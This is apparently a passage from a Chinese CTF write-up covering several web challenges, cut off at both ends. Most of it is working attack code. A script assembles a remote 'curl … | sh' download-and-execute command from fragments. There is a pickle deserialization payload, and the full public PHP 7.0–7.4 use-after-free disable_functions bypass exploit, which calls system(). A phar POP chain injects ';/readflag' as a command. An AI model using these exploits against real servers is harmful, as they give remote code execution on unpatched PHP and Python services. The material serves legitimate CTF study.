class="string">'&gt;y.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</span><br><span class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="string">'sh '</span> + pos2,</span><br><span class="line">    <span class="string">'sh '</span> + pos0,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    data = &#123;<span class="string">'url'</span>:<span class="string">'compress.zlib://data:@127.0.0.1/plain;base64,'</span>+base64.b64encode(i.encode()).decode()&#125;</span><br><span class="line">    r = s.post(url3, data=data)</span><br><span class="line">    print(r.text)</span><br><span class="line">    print(data[<span class="string">'url'</span>])</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>分析</p><p>考点是pickle反序列化，过滤掉了  R 指令码，并且重写了 <code>find_class</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="keyword">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br></pre></td></tr></table></figure><p>这就禁止引用除了 <code>__main__</code> 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改</p><p>于是可以先引入 <code>__main__.secret</code> 这个module，然后把一个 dict 压入栈，内容是 <code>{&#39;name&#39;: &#39;xx&#39;, &#39;category&#39;: &#39;yyy&#39;}</code>,之后执行 build指令，改写 <code>__main__.secret.name</code> 和 <code>__main__.secret.category</code>,此时 <code>secret.name</code>和 <code>secret.category</code> 已经变成我们想要的内容</p><p>之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03c__main__\nsecret\n&#125;(Vname\nVxx\nVcategory\nVyyy\nub0c__main__\nAnimal\n)\x81&#125;(S&#39;name&#39;\nS&#39;xx&#39;\nS&#39;category&#39;\nS&#39;yyy&#39;\nub.&quot;</span><br></pre></td></tr></table></figure><p>编码为base64提交即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h2 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h2><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">脚本</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line">rddshell</span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">'/readflag'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传到tmp目录就行了</p><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/1583803771844.png" alt></p><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p><code>www.zip</code> 源码泄露(现在好多web题都喜欢这么搞了)</p><p>这题主要是对伪造mysql的考察，但是有一个坑点</p><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/1583812041964.png" alt></p><p>我们可以设置<code>option</code>为8，然后就启用<code>MYSQL_OPT_LOCAL_INFILE</code>了。</p><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/1583812118883.png" alt></p><p>之后构造一个POP链就行了，POP链不是很长</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">";/readflag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Listfile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> Fileupload();</span><br><span class="line"></span><br><span class="line">$exp = <span class="keyword">new</span> Phar(<span class="string">'yds.phar'</span>);</span><br><span class="line">$exp -&gt; startBuffering();</span><br><span class="line">$exp-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$exp -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$exp -&gt; setMetadata($payload);</span><br><span class="line">$exp -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/2f3193b1/0.png" alt></p><h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>这题估计是很多队伍都比较头疼的了，3月7日那天折腾了一下午直到晚上才有师傅做出来</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $begin = <span class="string">"The number you want: "</span>;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Head can\'t be like this!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/log/i'</span>,$url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'No No No'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i'</span>,$url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $funcname = $head.<span class="string">'curl_init'</span>;</span><br><span class="line">    $ch = $funcname();</span><br><span class="line">    <span class="keyword">if</span>($ch)&#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        